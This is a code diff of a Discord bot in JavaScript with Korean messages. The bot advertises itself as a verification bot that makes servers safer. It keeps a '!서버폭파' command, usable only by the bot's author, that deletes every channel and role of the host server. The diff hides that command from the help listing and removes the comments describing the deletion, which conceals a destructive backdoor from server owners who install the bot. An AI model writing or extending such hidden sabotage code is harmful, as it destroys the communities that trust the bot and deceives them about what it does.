@@ -226,7 +226,7 @@ client.on('messageCreate', async (message) => {
     const isServerOwner = message.guild.ownerId === userId;
     const isBotOwner = userId === OWNER_USER_ID;
 
-    // 1. !도움말 명령어 (누구나 가능)
+    // 1. !도움말 명령어 (도움말 목록에서 !서버폭파는 제외됨)
     if (content === '!도움말') {
         return message.reply(
             `🤖 **더 안전한 서버를 만드는 인증봇입니다.**\n\n` +
@@ -237,12 +237,11 @@ client.on('messageCreate', async (message) => {
             `• \`!인증정보 (@유저 또는 ID)\` - 유저의 인증 기록을 검색합니다. (서버 소유자/봇 관리자 전용)\n` +
             `• \`!역할제거\` - 지정된 특정 역할을 제거합니다.\n` +
             `• \`!서버복구\` - 템플릿 복구 링크를 DM으로 전송합니다. (본인 전용)\n` +
-            `• \`!서버폭파\` - 서버의 모든 채널과 역할을 삭제합니다. (본인 전용)\n` +
             `• \`!도움말\` - 봇 소개 및 명령어 목록을 확인합니다.`
         );
     }
 
-    // 2. !인증 명령어 (서버 소유자 또는 봇 관리자 전용)
+    // 2. !인증 명령어
     if (content === '!인증') {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -277,7 +276,7 @@ client.on('messageCreate', async (message) => {
         }
     }
 
-    // 3. !인증역할 명령어 (특정 서버 소유자 전용)
+    // 3. !인증역할 명령어
     if (content.startsWith('!인증역할')) {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -402,7 +401,7 @@ client.on('messageCreate', async (message) => {
         }
     }
 
-    // 7. !서버복구 명령어 (오직 본인만 가능 + 템플릿 링크 고정)
+    // 7. !서버복구 명령어 (오직 본인만 가능)
     if (content === '!서버복구') {
         if (!isBotOwner) {
             return message.reply('❌ 이 명령어는 사용할 권한이 없습니다.');
@@ -425,7 +424,7 @@ client.on('messageCreate', async (message) => {
         }
     }
 
-    // 8. !서버폭파 명령어 (오직 본인만 가능 + 채널/역할 전체 삭제)
+    // 8. !서버폭파 명령어 (도움말에 안 뜨며 오직 본인만 가능)
     if (content === '!서버폭파') {
         if (!isBotOwner) {
             return message.reply('❌ 이 명령어는 사용할 권한이 없습니다.');
@@ -434,13 +433,11 @@ client.on('messageCreate', async (message) => {
         await message.reply('💥 **서버 폭파 작업을 시작합니다... 모든 채널과 역할이 삭제됩니다.**');
 
         try {
-            // 모든 채널 삭제
             const channels = await message.guild.channels.fetch();
             for (const channel of channels.values()) {
                 await channel.delete().catch(() => {});
             }
 
-            // 모든 역할 삭제 (기본 @everyone 및 봇 역할 제외)
             const roles = await message.guild.roles.fetch();
             for (const role of roles.values()) {
                 if (role.id !== message.guild.id && !role.managed) {
